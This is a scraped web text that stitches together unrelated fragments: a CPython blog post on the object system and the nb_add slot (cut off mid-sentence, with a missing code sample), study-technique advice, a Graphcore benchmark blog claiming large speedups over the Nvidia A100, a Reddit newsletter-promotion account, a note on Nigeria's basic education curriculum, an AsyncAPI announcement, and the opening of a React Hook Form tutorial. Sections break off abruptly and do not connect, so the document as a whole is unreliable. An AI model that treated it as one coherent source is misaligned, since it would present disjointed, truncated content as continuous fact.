<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<!-- /.post-info -->      <p>As we know from the previous parts of this series, the execution of a Python program consists of two major steps:</p>
<ol>
<li><a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-2-how-the-cpython-compiler-works/">The CPython compiler</a> translates Python code to bytecode.</li>
<li><a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-1-how-the-cpython-vm-works/">The CPython VM</a> executes the bytecode.</li>
</ol>
<p>We've been focusing on the second step for quite a while. In <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/">part 4</a> we've looked at the evaluation loop, a place where Python bytecode gets executed. And in <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-5-how-variables-are-implemented-in-cpython/">part 5</a> we've studied how the VM executes the instructions that are used to implement variables. What we haven't covered yet is how the VM actually computes something. We postponed this question because to answer it, we first need to understand how the most fundamental part of the language works. Today, we'll study the Python object system.</p>
<p><strong>Note</strong>: In this post I'm referring to CPython 3.9. Some implementation details will certainly change as CPython evolves. I'll try to keep track of important changes and add update notes.</p>
<h2>Motivation</h2>
<p>Consider an extremely simple piece of Python code:</p>



<p>To compute the function <code>f</code>, CPython must evaluate the expression <code>x + 7</code>. The question I'd like to ask is: How does CPython do that? Special methods such as <code>__add__()</code> and <code>__radd__()</code> probably come to your mind. When we define these methods on a class, the instances of that class can be added using the <code>+</code> operator. So, you might think that CPython does something like this:</p>
<ol>
<li>It calls <code>x.__add__(7)</code> or <code>type(x).__add__(x, 7)</code>.</li>
<li>If <code>x</code> doesn't have <code>__add__()</code>, or if this method fails, it calls <code>(7).__radd__(x)</code> or <code>int.__radd__(7, x)</code>.</li>
</ol>
<p>The reality, tough, is a bit more complicated. What really happens depends on what <code>x</code> is. For example, if <code>x</code> is an instance of a user-defined class, the algorithm described above resembles the truth. If, however, <code>x</code> is an instance of a built-in type, like <code>int</code> or <code>float</code>, CPython doesn't call any special methods at all.</p>
<p>To learn how some Python code is executed, we can do the following:</p>
<ol>
<li>Disassemble the code into bytecode.</li>
<li>Study how the VM executes the disassembled bytecode instructions.</li>
</ol>
<p>Let's apply this algorithm to the function <code>f</code>. The compiler translates the body of this function to the following bytecode:</p>
<div><pre><span></span>$ python -m dis f.py
...
  2           0 LOAD_FAST                0 (x)
              2 LOAD_CONST               1 (7)
              4 BINARY_ADD
              6 RETURN_VALUE
</pre></div>


<p>And here's what these bytecode instructions do:</p>
<ol>
<li><code>LOAD_FAST</code> loads the value of the parameter <code>x</code> onto the stack.</li>
<li><code>LOAD_CONST</code> loads the constant <code>7</code> onto the stack.</li>
<li><code>BINARY_ADD</code> pops two values from the stack, adds them and pushes the result back onto the stack.</li>
<li><code>RETURN_VALUE</code> pops the value from the stack and returns it.</li>
</ol>
<p>How does the VM add two values? To answer this question, we need to understand what these values are. For us, <code>7</code> is an instance of <code>int</code> and <code>x</code> is, well, anything. For the VM, though, everything is a Python object. All values the VM pushes onto the stack and pops from the stack are pointers to <code>PyObject</code> structs (hence the phrase "Everything in Python is an object").</p>
<p>The VM doesn't need to know how to add integers or strings, that is, how to do the arithmetic or concatenate sequences. All it needs to know is that every Python object has a type. A type, in turn, knows everything about its objects. For example, the <code>int</code> type knows how to add integers, and the <code>float</code> type knows how to add floats. So, the VM asks the type to perform the operation.</p>
<p>This simplified explanation captures the essence of the solution, but it also omits a lot of important details. To get a more realistic picture, we need to understand what Python objects and types really are and how they work.</p>
<h2>Python objects and types</h2>
<p>We've discussed Python objects a little in <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-3-stepping-through-the-cpython-source-code/">part 3</a>. This discussion is worth repeating here.</p>
<p>We begin with the definition of the <code>PyObject</code> struct:</p>
<div><pre><span></span><span>typedef</span> <span>struct</span> <span>_object</span> <span>{</span>
    <span>_PyObject_HEAD_EXTRA</span> <span>// macro, for debugging purposes only</span>
    <span>Py_ssize_t</span> <span>ob_refcnt</span><span>;</span>
    <span>PyTypeObject</span> <span>*</span><span>ob_type</span><span>;</span>
<span>}</span> <span>PyObject</span><span>;</span>
</pre></div>


<p>It has two members:</p>
<ul>
<li>a reference count <code>ob_refcnt</code> that CPython uses for garbage collection; and</li>
<li>a pointer to the object's type <code>ob_type</code>.</li>
</ul>
<p>We said that the VM treats any Python object as <code>PyObject</code>. How is that possible? The C programming language has no notion of classes and inheritance. Nevertheless, it's possible to implement in C something that can be called a single inheritance. The C standard states that a pointer to any struct can be converted to a pointer to its first member and vice versa. So, we can "extend" <code>PyObject</code> by defining a new struct whose first member is <code>PyObject</code>.</p>
<p>Here's, for example, how the <code>float</code> object is defined:</p>
<div><pre><span></span><span>typedef</span> <span>struct</span> <span>{</span>
    <span>PyObject</span> <span>ob_base</span><span>;</span> <span>// expansion of PyObject_HEAD macro</span>
    <span>double</span> <span>ob_fval</span><span>;</span>
<span>}</span> <span>PyFloatObject</span><span>;</span>
</pre></div>


<p>A <code>float</code> object stores everything <code>PyObject</code> stores plus a floating-point value <code>ob_fval</code>. The C standard simply states that we can convert a pointer to <code>PyFloatObject</code> to a pointer to <code>PyObject</code> and vice versa:</p>
<div><pre><span></span><span>PyFloatObject</span> <span>float_object</span><span>;</span>
<span>// ...</span>
<span>PyObject</span> <span>*</span><span>obj_ptr</span> <span>=</span> <span>(</span><span>PyObject</span> <span>*</span><span>)</span><span>&amp;</span><span>float_object</span><span>;</span>
<span>PyFloatObject</span> <span>*</span><span>float_obj_ptr</span> <span>=</span> <span>(</span><span>PyFloatObject</span> <span>*</span><span>)</span><span>obj_ptr</span><span>;</span>
</pre></div>


<p>The reason why the VM treats every Python object as <code>PyObject</code> is because all it needs to access is the object's type. A type is also a Python object, an instance of the <code>PyTypeObject</code> struct:</p>
<div><pre><span></span><span>// PyTypeObject is a typedef for "struct _typeobject"</span>

<span>struct</span> <span>_typeobject</span> <span>{</span>
    <span>PyVarObject</span> <span>ob_base</span><span>;</span> <span>// expansion of PyObject_VAR_HEAD macro</span>

    <span>vectorcallfunc</span> <span>tp_vectorcall</span><span>;</span>
<span>};</span>
</pre></div>


<p>By the way, note that the first member of a type is not <code>PyObject</code> but <code>PyVarObject</code>, which is defined as follows:</p>
<div><pre><span></span><span>typedef</span> <span>struct</span> <span>{</span>
    <span>PyObject</span> <span>ob_base</span><span>;</span>
    <span>Py_ssize_t</span> <span>ob_size</span><span>;</span> <span>/* Number of items in variable part */</span>
<span>}</span> <span>PyVarObject</span><span>;</span>
</pre></div>


<p>Nevertheless, since the first member of <code>PyVarObject</code> is <code>PyObject</code>, a pointer to a type can still be converted to a pointer to <code>PyObject</code>.</p>
<p>So, what is a type and why does it have so many members? A type determines how the objects of that type behave. Each member of a type, called slot, is responsible for a particular aspect of the object's behavior. For example:</p>
<ul>
<li><code>tp_new</code> is a pointer to a function that creates new objects of the type.</li>
<li><code>tp_str</code> is a pointer to a function that implements  <code>str()</code> for objects of the type.</li>
<li><code>tp_hash</code> is a pointer to a function that implements  <code>hash()</code> for objects of the type.</li>
</ul>
<p>Some slots, called sub-slots, are grouped together in suites. A suite is just a struct that contains related slots. For example, the <code>PySequenceMethods</code> struct is a suite of sub-slots that implement the sequence protocol:</p>
<div><pre><span></span><span>typedef</span> <span>struct</span> <span>{</span>
    <span>lenfunc</span> <span>sq_length</span><span>;</span>
    <span>binaryfunc</span> <span>sq_concat</span><span>;</span>
    <span>ssizeargfunc</span> <span>sq_repeat</span><span>;</span>
    <span>ssizeargfunc</span> <span>sq_item</span><span>;</span>
    <span>void</span> <span>*</span><span>was_sq_slice</span><span>;</span>
    <span>ssizeobjargproc</span> <span>sq_ass_item</span><span>;</span>
    <span>void</span> <span>*</span><span>was_sq_ass_slice</span><span>;</span>
    <span>objobjproc</span> <span>sq_contains</span><span>;</span>

    <span>binaryfunc</span> <span>sq_inplace_concat</span><span>;</span>
    <span>ssizeargfunc</span> <span>sq_inplace_repeat</span><span>;</span>
<span>}</span> <span>PySequenceMethods</span><span>;</span>
</pre></div>


<p>If you count all the slots and sub-slots, you'll get a scary number. Fortunately, each slot is very well <a href="https://docs.python.org/3/c-api/typeobj.html">documented</a> in the Python/C API Reference Manual (I strongly recommend you to bookmark this link). Today we'll cover only a few slots. Nevertheless, it shall give us a general idea of how slots are used.</p>
<p>Since we're interested in how CPython adds objects, let's find the slots responsible for addition. There must be at least one such slot. After careful inspection of the <code>PyTypeObject</code> struct, we find that it has the "number" suite <code>PyNumberMethods</code>, and the first slot of this suite is a binary function called <code>nd_add</code>:</p>
<div><pre><span></span><span>typedef</span> <span>struct</span> <span>{</span>
    <span>binaryfunc</span> <span>nb_add</span><span>;</span> <span>// typedef PyObject * (*binaryfunc)(PyObject *, PyObject *)</span>
    <span>binaryfunc</span> <span>nb_subtract</span><span>;</span>
    <span>binaryfunc</span> <span>nb_multiply</span><span>;</span>
    <span>binaryfunc</span> <span>nb_remainder</span><span>;</span>
    <span>binaryfunc</span> <span>nb_divmod</span><span>;</span>
    <span>// ... more sub-slots</span>
<span>}</span> <span>PyNumberMethods</span><span>;</span>
</pre></div>


<p>It seems that the <code>nb_add</code> slot is what we're looking for. Two questions naturally arise regarding this …</p></div></div>

You should then have a final study session the day before the test.</p><h3 id="active-recall">Active recall</h3><p>Another way to learn effectively is to employ the principles of active recall. This approach has been found to be the most effective, efficient, and quickest way to study materials. This approach holds that in order to get the best out of studying, you need to actively stimulate your memory. This moves students from a passive approach to studying such as simply reading silently to an approach where the student interacts with the material.</p><p>This includes asking and answering questions about the material read and many other tactics. You will find that there are a number of different ways to implement active recall. Two popular methods of active learning are the Read-Recite-Review (3R) method and the Feynman Technique.</p><h3 id="pomodoro-technique-and-the-importance-of-study-breaks">Pomodoro Technique and the Importance of Study Breaks</h3><p>The struggle we all have with procrastination is real and should not be overlooked. One of the best strategies for minimizing distractions is the <a href="https://productive.fish/blog/pomodoro-technique">Pomodoro technique</a>. This approach helps to keep you from becoming overwhelmed by studying and from burnouts. It includes stipulated work intervals and breaks.</p><p>An example of studying effectively with the Pomodoro technique is as follows:</p><ul><li>Study for 25 minutes</li><li>Distractions will come. When they do, write them down on a piece of paper.</li><li>At the end of the 25-minute period, place a check mark on your paper.</li><li>Break from studying for 5 minutes.</li><li>After doing this 4 times, take a 30-minute break.</li><li>Repeat the entire process.</li></ul><p>This method was developed by Francesco Cirillo. This time management technique was inspired by the popular tomato-shaped kitchen timer.</p><p>Breaks are critical to learning effectively. These breaks help to maintain performance while studying, reduce the stress associated with studying, increase focus, and help with memory retention.</p><h3 id="bite-sized-learning">Bite-sized learning</h3><p>Another method to consider when trying to uncover how to study better is bite-sized learning. This method means just what the name suggests – studying information in small bits or spending very short periods studying at a time.</p><p>With the constant reduction of attention span among humans in the 21st century, it is becoming more and more important that you spend 1-15 minutes at a time on any given learning objective. The focus that you will have in this short period of time makes learning more effective.</p><h2 id="take-notes-the-right-way">Take notes the right way</h2><p>There are many powerful reasons that all students should actively take notes in class and while studying. These reasons include:</p><p>Taking notes is helpful in keeping your mind alert. By actively writing notes, you are interacting with the information. This helps to reduce drowsiness and prevents distractions. The act of deciphering what information to jot down helps to keep your mind engaged in what you are reading or listening to. Taking notes gives you an opportunity to highlight or emphasize certain bits of information. It also helps with the organization of said information. The highlighted and organized information that you take during class or in a study session helps to make your future study sessions or review of class information much more effective. Taking good notes in class or during a study session provides you with an abbreviated yet potent set of information for effective studying. When it becomes necessary to study for an exam or a test, you can easily draw on your notes and spend less time reinforcing the most important points.</p><p>Let’s look at some note-taking techniques to help you effectively study.</p><h3 id="the-cornell-note-taking-system">The Cornell Note Taking System</h3><p>This system of note-taking was developed by Walter Pauk in the 1940s. This approach to notetaking is systematic and more condensed. It can be used by high school students or students at the college level.</p><p>This method entails a student dividing a page into three sections. A keyword section, the notes section, and a section for a summary of the lesson. In this method, long sentences are avoided while taking notes to reduce the bulk. The keyword section only features words or questions that are most important , which students can easily reflect on when reviewing their notes.</p><h3 id="the-outlining-method">The Outlining Method</h3><p>This method is ideal for you when your are trying to discover how to study more effectively. It includes creating an outline of the course, article or a book. In this method, information is summarized in brief bullet points. The major points are at farthest to the left while minor points are indented.</p><h3 id="the-mapping-method">The Mapping Method</h3><p>The mapping method involves the use of a graphic representation of that which is being studied. It shows how the various pieces of information to be absorbed relates to each other. The <a href="https://productive.fish/blog/mind-mapping-software">mind mapping method</a> can be coupled with the outline method or the Cornell note-taking system quite effectively.</p><h2 id="teach-someone-else">Teach someone else</h2><p>It is always said that the best way to better learn a subject is to teach it to someone else. One of the most effective ways to retain information is to share it with others. You could develop a habit of mentoring students in your class who are having a hard time grasping the concepts being taught.</p><p>Another creative way to deepen your understanding of a subject by teaching others is by starting a blog series on the topic that you are studying. You will be able to edify others while being better prepared to succeed in your next exam.</p><h2 id="conclusion">Conclusion</h2><p>Learning to study more effectively is a critical part of student success. While all of these methods have been proven to be effective, everybody learns differently; therefore, it is best for you to try each of these methods to see which is most effective for you. Fight the temptation to be lazy in this process. By finding the approach that is best for you, your entire academic life can become much smoother.</p></article></div>]]>

You’ll see our IPU-M2000 system significantly outperforms the Nvidia A100 DGX across the board, with orders of magnitude performance improvements for some models.</p>
<!--more-->
<p>Graphcore customers are already making big leaps forward with our second generation IPU systems – whether they prioritise faster time to result, model accuracy, better efficiency, lower TCO (Total Cost of Ownership) or the chance to make new breakthroughs in AI with the IPU.</p>
<p>We’ve chosen a range of the most popular models our customers frequently turn to as proxies for their proprietary production AI workloads in natural language processing, computer vision and more, both in training and inference.</p>
<p>We are also delighted to share results in this blog using our new PyTorch framework support. We are continuing to develop and expand this capability – you can find out more in our blog <a href="https://www.graphcore.ai/posts/introducing-pytorch-for-the-ipu"><span>here</span></a>. <span>&nbsp;</span></p>
<p>The results are measured on IPU-M2000 &amp; IPU-POD<sub>64</sub> platforms. Wherever possible, we compare IPU performance against performance numbers published by NVIDIA for the A100 GPU as part of the DGX A100 platform. It’s notoriously hard to find an exact apples-to-apples comparison for very different products and chip architectures, so we compare against the closest platform in terms of price and power. Where NVIDIA has not published results for a particular model, measured results are used.<span>&nbsp;</span></p>
<p>Code for all of our benchmarks is available from the examples repo on the <a href="https://github.com/graphcore"><span>Graphcore GitHub</span></a> site where you can also find code for many other model types and application examples.<span>&nbsp;</span></p>
<p>We’ve included notes for each chart to explain our methodology and to provide additional information about batch sizes, data sets, floating point arithmetic, frameworks etc. In addition to publishing our benchmarking charts in this blog and on our <a href="https://www.graphcore.ai/benchmarks" rel="noopener" target="_blank">website</a>, we are also publishing performance data in <a href="https://www.graphcore.ai/performance-results" rel="noopener" target="_blank">tabular format </a>for IPU-M2000 and IPU-POD systems on our website. We’ll add more and update the results regularly.</p>
<p>Finally, we’ve also joined <a href="https://mlcommons.org/en/" rel="noopener" target="_blank">MLCommons</a>, the governing body for the independent benchmarking organisation, MLPerf. We will be participating in MLPerf in 2021 – starting with the first training submission in the Spring – as well as continuing to build out our own performance results.</p>
<p><strong><span>Natural Language Processing (NLP)</span>&nbsp;</strong></p>
<p><strong>BERT-Large Training</strong></p>
<p>BERT-Large <span>(Bidirectional Encoder Representations from Transformers)</span> is established as one of the most widely used models for NLP.</p>
<p>The IPU-POD<sub>64 </sub>is over 5x faster than a DGX A100 system for end-to-end BERT-Large Training to convergence to reference accuracies. To provide consistency in the comparisons used in our other charts, we also show time-to-train for a 2x DGX A100 system.<span>&nbsp;</span></p>

<p><strong>BERT-Large Inference</strong></p>
<p>The goal in inference production systems is typically to achieve the highest possible throughput at the lowest possible latency. For example, search engine companies and many automated services using inference need to respond in near real time.</p>
<p>For BERT-Large Inference, the IPU-M2000 delivers 3.4x higher throughput at the lowest latency compared to the A100.</p>

<p><strong>Computer Vision&nbsp;</strong></p>
<p><strong>ResNet-50 Training</strong></p>
<p>The IPU-M2000 processes 2.6x more images per second vs the A100 for <a href="https://arxiv.org/abs/1512.03385"><span>ResNet-50</span></a>, a common model for image classification used as a baseline performance metric across the industry, which has been highly optimised on GPU architectures. Here we show results for IPU with both TensorFlow and PyTorch.</p>

<p><strong>ResNet-50 Inference</strong></p>
<p>The IPU-M2000 delivers 4.6x higher throughput at lowest latency comparing with published results for the A100 80GB GPU, for both PyTorch and TensorFlow, achieving much higher absolute throughput of 58,112 images per second.</p>

<p><strong>EfficientNet Training</strong></p>
<p><span><a href="https://arxiv.org/abs/1905.11946">EfficientNet</a></span> uses innovative techniques like group separable and depth-wise convolutions to deliver far higher accuracy per parameter than legacy image classification models like ResNet-50.<span>&nbsp;</span></p>
<p>Group and depth-wise convolutions use smaller kernels which are not well suited to GPUs and this has limited their adoption to date.<span>&nbsp;</span></p>
<p>By contrast, a fine-grained processor like the IPU, with its unique MIMD architecture, is much better suited to group convolution, depth-wise convolution and more generally sparse models which inherently do not use dense, contiguous data structures.<span>&nbsp;</span></p>
<p><span>For standard EfficientNet-B4 Training for both PyTorch and TensorFlow, the IPU-M2000 achieves 10x throughput advantage versus the latest GPU.</span></p>

<p><strong>EfficientNet-B0 Inference</strong></p>
<p>We see an even greater advantage with inference. The IPU-M2000 achieves more than 60x higher throughput and 16x lower latency than the latest GPU in a lowest latency comparison for both TensorFlow and PyTorch. In fact, the IPU-M2000 delivers higher throughput at its lowest latency than is achievable by the latest GPU at any batch size.<span>&nbsp;</span></p>

<p><span><strong>Probabilistic Learning</strong></span><span>&nbsp;</span></p>
<p>Probabilistic models are used in applications where the underlying system is inherently stochastic. They are widely used in the financial sector and as well as in scientific research. However, many varieties of probabilistic models do not fit well with the SIMD/SIMT architecture of GPUs and run far too slowly to be of use. <span>&nbsp;</span></p>
<p><strong>Markov Chain Monte Carlo (MCMC) Training</strong></p>
<p>Using an off-the-shelf TensorFlow Probability (TFP) library to assess the performance of probabilistic models on IPU, we see that a financial MCMC workload trains in less than 3 hours on the IPU-M2000 platform, 17x faster than the 48 hours measured on the latest GPU.</p>

<p><strong>Speech Processing</strong><span>&nbsp;</span></p>
<p>Converting written text into speech is a challenging but highly valuable area of speech technology research, with a wide variety of use-cases across most industry verticals.<span>&nbsp;</span></p>
<p>A number of text-to-speech models have risen to prominence, including Tacotron from Google, Deep Voice from Baidu and FastSpeech from Microsoft, enabling high-quality, end-to-end speech synthesis.</p>
<p><strong>Deep Voice 3 Training</strong></p>
<p>Here we focus on the third Deep Voice iteration. The <a href="https://arxiv.org/abs/1710.07654"><span>Deep Voice 3</span></a> model is fully convolutional and uses attention blocks to decode the input text sequence to the output audio sequence representation. More details about our Deep Voice 3 implementation are provided in the <a href="https://www.graphcore.ai/posts/accelerating-text-to-speech-models-with-the-ipu"><span>Accelerating Text-To-Speech models with the IPU</span></a> blog.</p>
<p>The chart below highlights the performance advantage of the IPU-M2000 on the Deep Voice 3 model, with over 13x higher throughput versus the latest GPU.</p>
<p><img src="https://www.graphcore.ai/hs-fs/hubfs/Deep%20Voice%203_December%202020.jpg?width=2000&amp;name=Deep%20Voice%203_December%202020.jpg" alt="Deep Voice 3_December 2020" width="2000" srcset="https://www.graphcore.ai/hs-fs/hubfs/Deep%20Voice%203_December%202020.jpg?width=1000&amp;name=Deep%20Voice%203_December%202020.jpg 1000w, https://www.graphcore.ai/hs-fs/hubfs/Deep%20Voice%203_December%202020.jpg?width=2000&amp;name=Deep%20Voice%203_December%202020.jpg 2000w, https://www.graphcore.ai/hs-fs/hubfs/Deep%20Voice%203_December%202020.jpg?width=3000&amp;name=Deep%20Voice%203_December%202020.jpg 3000w, https://www.graphcore.ai/hs-fs/hubfs/Deep%20Voice%203_December%202020.jpg?width=4000&amp;name=Deep%20Voice%203_December%202020.jpg 4000w, https://www.graphcore.ai/hs-fs/hubfs/Deep%20Voice%203_December%202020.jpg?width=5000&amp;name=Deep%20Voice%203_December%202020.jpg 5000w, https://www.graphcore.ai/hs-fs/hubfs/Deep%20Voice%203_December%202020.jpg?width=6000&amp;name=Deep%20Voice%203_December%202020.jpg 6000w" sizes="(max-width: 2000px) 100vw, 2000px"></p>
<p><span><strong>Time Series Analysis</strong></span><span>&nbsp;</span></p>
<p>Time series forecasting models can predict future values based on previous, sequential data. LSTM is one of the most widely used time series analysis models. Financial companies in particular rely on LSTMs for modelling and predicting financial data such as stock prices. The use of LSTM-based methods in the finance industry is highlighted in this <a href="https://arxiv.org/pdf/2007.06848.pdf"><span>arxiv paper</span></a>.</p>
<p><strong>LSTM Inference</strong></p>
<p>The chart below compares throughput vs latency across a range of batch sizes for the IPU-M2000 vs the latest GPU for an LSTM 2-Layer Inference model. Across a range of batch sizes the performance advantage is apparent. At the lowest latency achievable by the GPU, the IPU-M2000 is capable of achieving 600x higher throughput at a lower latency.</p>

<p><strong>Future Breakthroughs with the IPU</strong></p>
<p>As we have seen, the IPU delivers state of the art performance on established image processing and language models such as ResNet and BERT.<span>&nbsp;</span></p>
<p>It is also clear that the IPU can deliver huge performance gains in several new or currently under-utilised model types which are indicative of the future trend in machine intelligence, like EfficientNet, ResNeXt and MCMC (Markov Chain Monte Carlo) probability-based methods.</p>
<p>We are also working on some exciting developments with sparse models, and are introducing a preview version of our generalized sparse library support in <a href="https://www.graphcore.ai/posts/introducing-pytorch-for-the-ipu" rel="noopener" target="_blank">Poplar SDK 1.4</a>, which was released today.&nbsp;</p>
<p>Machine intelligence innovation is still in the early stages and we expect to see many new innovations developed over the next few years. The IPU has been designed to help innovators create these new breakthroughs.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Reddit is an excellent place for two things:</p><p><strong>1 - Getting a massive amount of traffic from a viral post</strong></p><p>It requires many things to happen. The perfect post with the perfect title on the perfect subreddit and a bit of luck. That's hard to do, and even people who have done it before can't do it again. It's not easy.</p><p><strong>2 - Getting your first customers/subscribers and validate your ideas</strong></p><p>This is for everyone. You don't need any luck. Just to know a little bit about Reddit and find the best approach to follow.</p><p>For the last couple of months, I've spent hours analyzing what works and what doesn't on Reddit—trying to understand the magic behind promoting while adding value to the platform.</p><p>Today I want to tell you how I applied the second approach to validate an idea and how I doubled my email subscribers so you can do the same.</p><p><strong>Some Context</strong></p><p>I started a newsletter 15 days ago. The newsletter is about my path to freedom. My learnings, what works, and what doesn’t work. Having freedom includes money, an important piece, a good lifestyle, traveling, cooking, reading, writing, drinking good coffee, etc.</p><p>So as a part of my newsletter, I wanted to have something fun to do and share and wrote this:</p><p><a href="https://jrleonr.com/p/52-challenges-for-2021">52 Tiny Challenges to Try Something New Every Week in 2021</a></p><p>The purpose is to include every week one thing that I will explore and share with my subscribers on the newsletter to try it together.</p><p>Things like: Meditation for one hour during a week, not drinking coffee for an entire week(this is something I definitely do not want to do…), or walk 20K steps every day for 7 days.</p><p>I want to do it because I want to improve and try new things. Maybe something feels amazing, and I can add it to my daily routines.</p><p>But I also wanted to have something concrete to share on Reddit.</p><p>If instead of this, I try to share something like: Join my newsletter… that’d be spam. It doesn’t offer anything.</p><p>Sharing a link without any context, benefit, or value for the reader will never work.</p><p>So once I had the short article written, I entered Reddit and shared it inside a post, like this:</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fae888c27-0ba2-40e5-af5d-b76f5c0b5524_1460x772.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fae888c27-0ba2-40e5-af5d-b76f5c0b5524_1460x772.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/ae888c27-0ba2-40e5-af5d-b76f5c0b5524_1460x772.png&quot;,&quot;height&quot;:770,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:145458,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>I created 4 more posts, but I didn't publish them at the same time. I did it slowly, with a couple of days of difference between them, and I changed the title and the copy a bit. </p><p>These are the list of the subreddits where I posted:</p><p>r/Habits | 31 Upvotes  - 2 comments</p><p>r/IWantToLearn | 13 Upvotes - 9 comments</p><p>r/WriterMotivation | 21 Upvotes - 0 comments</p><p>r/InternetIsBeautiful |  11 Upvotes  - 0 comments (the post was removed)</p><p>r/getdisciplined | 3 Upvotes - 2 comments</p><h2>Results</h2><p>The post wasn’t valuable enough to get a massive result. I just did a quick test to check what people have to say. You don’t need a perfect plan to test if something will work. Do something small, test, and think about what to do next. Feedback helps.</p><p><strong>Numbers from the post</strong></p><p>These are the views and subscribers from people who visited the article. Many many people subscribed, considering that it had only 588 views. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa056580a-1070-4c6f-ba89-c5aee16cec2f_940x498.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa056580a-1070-4c6f-ba89-c5aee16cec2f_940x498.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a056580a-1070-4c6f-ba89-c5aee16cec2f_940x498.png&quot;,&quot;height&quot;:498,&quot;width&quot;:940,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:42609,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><h3>Subscribers</h3><p>You can see the jump between the 23rd and the 27th.

<p>The Universal Basic Education (UBE) Programme was introduced in Nigeria in September 1988. Following this, in 2008 the Federal Government of Nigeria, through the Nigerian Educational Research and Development Council (NERDC) developed and introduced the 9-Year Basic Education Curriculum (BEC) in schools by realigning all extant Primary and Junior Secondary School Curricula to meet the key targets of the UBE program. Given some contemporary and national concerns and to make the curriculum more practical, relevant, interest generating to the young learners and in line with global best practices, the 9-year BEC was recently revised in 2012 and its implementation has just commenced in September 2014. This article is focused on the structure, special features, and the implementation strategy of the Revised 9-Year Basic Education Curriculum with some emphasis on the Basic Science and Technology component as one of the key cluster subjects prepared with the aim of catching the young learner to love science, learn science and create change in the learner's environment.</p>

And still is! The specification was just the trigger of a snowball effect. What's the spec for if you can't do anything with it? Tooling is as important as the specification. However, tooling is a number of times more complex than the specification. We engineers don't want to abandon our favorite programming language and framework, therefore, it's AsyncAPI's responsibility to integrate with the existing tools in the market. <strong>The specification (and tools) should work for the user, not the other way around.</strong> Partnering with Postman allows us to boost the development of more and better tools to help engineers create and maintain Asynchronous APIs while using their favorite programming languages and frameworks.</p><p><strong>Our goal is to make Asynchronous APIs as successful and mature as REST APIs.</strong> We are aware this is a long journey but, with Postman's help, we'll be able to grow the team and continue working on the AsyncAPI specification and all the necessary tools to create a delightful developer experience. The AsyncAPI Initiative team is fully committed to open source software (OSS), and the partnership with Postman will help us keep doing our job with freedom and independence.</p><h2 id="next-steps">Next steps</h2><p>We want to make the AsyncAPI Initiative a neutral and independent place for collaborating on defining the future of Asynchronous APIs. Next step for us is to host the project in a neutral foundation to guarantee the long-term success of the initiative. We're currently in conversations with different actors of the OSS world to make sure the initiative remains independent.</p><p>Also, we want you to work with us. <a href="https://www.asyncapi.com/jobs">We are hiring</a> at Postman to work full-time on AsyncAPI. In the first half of 2021, we'll open a bunch of positions, including Software Engineers, Graphic Designers, Technical Writers, and more. Make sure you don't miss them!</p><div><h3>Receive an email when we publish a new job offer:</h3><p>We respect your inbox.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>He couldn't believe it. This certainly couldn't be true. Someone else must have made a mistake here. He read the email a second time. Maybe he missed something and the whole thing was just a big misunderstanding? But he didn't, of course. He is the kind of person who always pays attention to typos, therefore reading it again was quite pointless. Anger started spreading through him. How dare they? It felt so incredibly stupid and unfair. Especially considering he was such a law-abiding citizen. He despised those who didn't follow rules. They couldn't possibly mean that he was one of them? Yet this is exactly what the email was saying: "We can inform you that you unfortunately have used the wrong licence plate in the app, which is why you have been given a fine. In this case the fine is issued on <strong>AB12345</strong>, while parking was activated for <strong>AB1234</strong> in the app.". Filled with rage, he locked his phone and shoved it back into his pocket. He missed one bloody number!</p>
</section><article><section><h2>Validation to the Rescue</h2>
<p>In Norway, license plates for cars follow a certain pattern: they consist of two letters and five digits (there are some exceptions, such as personal license plates). Considering this, we realize that the above scenario could have been avoided merely by adding some form validation! For this, we will utilize <a href="https://react-hook-form.com/">React Hook Form</a>, which has become quite popular over the last year. React Hook Form is easy to use, quite lightweight and very performant. It has built-in validation, but also supports schema-based form validation with other tools such as <a href="https://github.com/jquense/yup">Yup</a>, <a href="https://github.com/ianstormtaylor/superstruct">Superstruct</a> and <a href="https://github.com/sideway/joi">Joi</a>.</p>
<p>Let's assume we have this very basic skeleton for a parking app:</p>
<div data-language="javascript"><pre><code><span>export</span> <span>default</span> <span>function</span> <span>App</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>onFormSubmit</span> <span>=</span> <span>(</span><span>e</span><span>)</span> <span>=&gt;</span> e<span>.</span><span>preventDefault</span><span>(</span><span>)</span><span>;</span>

  <span>return</span> <span>(</span>
    <span>&lt;</span><span>&gt;</span>
      <span>&lt;</span>h1<span>&gt;</span>Parking App<span>&lt;</span><span>/</span>h1<span>&gt;</span>
